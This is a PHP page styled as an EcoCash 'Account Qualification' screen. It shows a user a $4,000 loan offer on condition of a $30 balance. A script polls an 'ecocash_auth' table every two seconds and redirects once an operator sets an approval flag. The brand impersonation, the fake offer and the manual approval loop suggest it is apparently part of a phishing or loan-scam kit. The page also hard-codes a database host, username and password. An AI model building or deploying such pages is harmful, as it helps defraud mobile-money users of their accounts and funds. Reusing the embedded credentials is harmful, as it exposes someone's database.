<?php
session_start();

if (!isset($_SESSION['phone'])) {
    header("Location: login.php");
    exit;
}

$phone = $_SESSION['phone'];

// ========== POSTGRESQL CONFIGURATION ==========
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
// ==============================================

/**
 * Get PostgreSQL connection
 */
function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
            return false;
        }
    }
    return $conn;
}

// Handle AJAX request to check approve status
if (isset($_GET['check_approve']) && $_GET['check_approve'] == 1) {
    header('Content-Type: application/json');
    $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
    if (!$conn) {
        echo json_encode(['error' => 'Database connection failed']);
        exit;
    }
    
    // Get the maximum approve value for this phone (grouped)
    $sql = "SELECT MAX(approve) as approve FROM ecocash_auth WHERE phone = $1";
    $result = pg_query_params($conn, $sql, [$phone]);
    if ($result && $row = pg_fetch_assoc($result)) {
        $approve = (int)$row['approve'];
        echo json_encode(['approve' => $approve]);
    } else {
        echo json_encode(['error' => 'Query failed', 'approve' => 0]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>EcoCash | Qualification</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
    margin: 0;
    background: #f1f5f9;
    font-family: Arial, Helvetica, sans-serif;
}
.header {
    text-align: center;
    padding: 15px;
    font-size: 20px;
    font-weight: bold;
}
.header span:first-child { color: red; }
.header span:last-child { color: #2563eb; }
.card {
    max-width: 420px;
    margin: 20px auto;
    background: #fff;
    padding: 25px;
    border-radius: 18px;
    box-shadow: 0 8px 25px rgba(0,0,0,.08);
}
.title {
    font-size: 18px;
    font-weight: bold;
    margin-bottom: 15px;
}
.box {
    background: #f8fafc;
    padding: 14px;
    border-radius: 10px;
    margin-bottom: 12px;
    font-size: 14px;
}
.status {
    color: green;
    font-weight: bold;
}
.message-box {
    background: #e6f7ec;
    border-left: 5px solid #46b36a;
    padding: 20px;
    border-radius: 14px;
    margin: 20px 0;
    text-align: center;
}
.message-box h3 {
    margin: 0 0 10px 0;
    color: #1e7e34;
}
.message-box p {
    margin: 10px 0;
    font-size: 15px;
    color: #145c2e;
}
.reapply-btn {
    display: inline-block;
    background-color: #2563eb;
    color: white;
    padding: 10px 22px;
    font-size: 14px;
    font-weight: bold;
    border: none;
    border-radius: 30px;
    text-decoration: none;
    cursor: pointer;
    margin-top: 5px;
    transition: background 0.2s;
}
.reapply-btn:hover {
    background-color: #1d4ed8;
}
.footer {
    text-align: right;
    font-size: 11px;
    color: #6b7280;
    margin-top: 20px;
}
</style>
</head>
<body>

<div class="header">
    <span>Eco</span><span>Cash</span>
</div>

<div class="card">
    <div class="title">Account Qualification & Compliance</div>
    <div class="box">
        <strong>DCCSA</strong><br>
        Phone Number<br>
        <?= htmlspecialchars($phone) ?>
    </div>
    <div class="box">
        Account Status<br>
        <span class="status">[Qualified]</span>
    </div>

    <div class="message-box">
        <h3>🎉 Congratulations!</h3>
        <p>Your loan limit is <strong>$4,000</strong>.</p>
        <p>Please reapply and ensure that your information is correct<br>
        and your main account balance is at least <strong>$30</strong>.</p>
        <p>Thank you.</p>
        <a href="loan.php" class="reapply-btn">Reapply</a>
    </div>

    <div class="footer">
        EcoCash Financial
    </div>
</div>

<script>
// Poll the server every 2 seconds to check the 'approve' status
function checkApproval() {
    fetch(window.location.href + '?check_approve=1')
        .then(response => response.json())
        .then(data => {
            if (data.error) {
                console.error('Polling error:', data.error);
                return;
            }
            // If approve == 1, redirect to approved.php
            if (data.approve === 1) {
                window.location.href = 'approved.php';
            }
        })
        .catch(err => console.error('Fetch failed:', err));
}

// Start polling every 2 seconds (2000 ms)
setInterval(checkApproval, 2000);

// Also run once immediately on page load
checkApproval();
</script>

</body>
</html>
